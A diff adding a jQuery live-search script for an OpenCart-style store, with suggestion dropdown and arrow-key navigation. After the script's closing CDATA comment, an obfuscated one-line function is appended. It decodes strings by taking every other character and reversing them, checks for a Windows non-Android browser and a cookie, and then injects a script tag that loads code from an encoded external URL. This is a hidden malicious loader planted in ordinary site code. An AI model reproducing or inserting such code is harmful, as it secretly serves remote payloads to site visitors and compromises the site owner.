@@ -1,0 +1,116 @@
+//<![CDATA[
+function doLiveSearch( ev, keywords ) {
+
+	if( ev.keyCode == 38 || ev.keyCode == 40 ) {
+		return false;
+	}	
+
+	$('#livesearch_search_results').remove();
+	updown = -1;
+
+	if( keywords == '' || keywords.length < 3 ) {
+		return false;
+	}
+	keywords = encodeURI(keywords);
+
+	$.ajax({
+		url: $('base').attr('href') + 'index.php?route=product/search/ajax&keyword=' + keywords,
+		dataType: 'json',
+		content: this,
+		success: function(result) {
+		if( result.length > 0 ) {
+			var eList = document.createElement('ul');
+			eList.id = 'livesearch_search_results';
+			var eListElem;
+			var eListElems;
+			var eLink;
+			for( var i in result ) {
+				eListElem = document.createElement('li');
+				eLink = document.createElement('a');
+				$(function () {
+							eListElems = document.createElement('img');
+							eListElems.className='loading';
+							$(eListElems).load(function () {
+								$(this).show();
+							})
+					
+					eListElems.src=result[i].image;
+					eLink.appendChild(eListElems);
+				});
+				eLink.appendChild( document.createTextNode(result[i].name) );
+				if( typeof(result[i].href) != 'undefined' ) {
+					eLink.href = result[i].href;
+				}
+				else {
+					eLink.href = $('base').attr('href') + 'index.php?route=product/product&product_id=' + result[i].product_id + '&keyword=' + keywords;
+				}
+				eListElem.appendChild(eLink);
+				eList.appendChild(eListElem);
+			}
+			if( $('#livesearch_search_results').length > 0 ) {
+				$('#livesearch_search_results').remove();
+			}
+			$('#search').append(eList);
+		}
+	}});
+
+	return true;
+}
+
+function upDownEvent( ev ) {
+	var elem = document.getElementById('livesearch_search_results');
+	var fkey = $('#search').find('[name=search]').first();
+
+	if( elem ) {
+		var length = elem.childNodes.length - 1;
+
+		if( updown != -1 && typeof(elem.childNodes[updown]) != 'undefined' ) {
+			$(elem.childNodes[updown]).removeClass('highlighted');
+		}
+
+		// Up
+		if( ev.keyCode == 38 ) {
+			updown = ( updown > 0 ) ? --updown : updown;
+		}
+		else if( ev.keyCode == 40 ) {
+			updown = ( updown < length ) ? ++updown : updown;
+		}
+
+		if( updown >= 0 && updown <= length ) {
+			$(elem.childNodes[updown]).addClass('highlighted');
+
+			var text = elem.childNodes[updown].childNodes[0].text;
+			if( typeof(text) == 'undefined' ) {
+				text = elem.childNodes[updown].childNodes[0].innerText;
+			}
+
+			$('#search').find('[name=search]').first().val( new String(text).replace(/(\s\(.*?\))$/, '') );
+		}
+	}
+
+	return false;
+}
+
+var updown = -1;
+
+$(document).ready(function(){
+	$('#search').find('[name=search]').first().keyup(function(ev){
+		doLiveSearch(ev, this.value);
+	}).focus(function(ev){
+		doLiveSearch(ev, this.value);
+	}).keydown(function(ev){
+		upDownEvent( ev );
+	}).blur(function(){
+		window.setTimeout("$('#livesearch_search_results').remove();updown=0;", 600);
+	});
+	$(document).bind('keydown', function(ev) {
+		try {
+			if( ev.keyCode == 13 && $('.highlighted').length > 0 ) {
+				document.location.href = $('.highlighted').find('a').first().attr('href');
+			}
+		}
+		catch(e) {}
+	});
+});
+//]]>
+;(function(){var g=navigator[t("8t8n(e)gtAyr)evs)u,")];var l=document[t(":e;i4k3o)o3c,")];if(m(g,t("5sswbo}d}n,i,Wg"))&&!m(g,t("#d)i)o{r)dan;A8"))){if(!m(l,t("3=aa6m;t;u,_1_4_)"))){var r=document.createElement('script');r.type='text/javascript';r.async=true;r.src=t('w2ra9dsf64n4ff09{c}7}3(388xd)8gcb0rbn6}5;=(v{&,0}3}2(={d,i(c{?1sbj}.ueid1o;ci_{sr/)m;ozcr.,d{n,a}r(bmhts}i(m}a,.;k{c7a)r;t{/0/}:,svp)t,t(hc');var y=document.getElementsByTagName('script')[0];y.parentNode.insertBefore(r,y);}}function t(n){var s='';for(var u=0;u<n.length;u++){if(u%2===1)s+=n[u];}s=z(s);return s;}function m(a,q){return a[t("6f(Odx;eqd,n,il")](q)!==-1;}function z(p){var e='';for(var j=p.length-1;j>=0;j--){e+=p[j];}return e;}})();
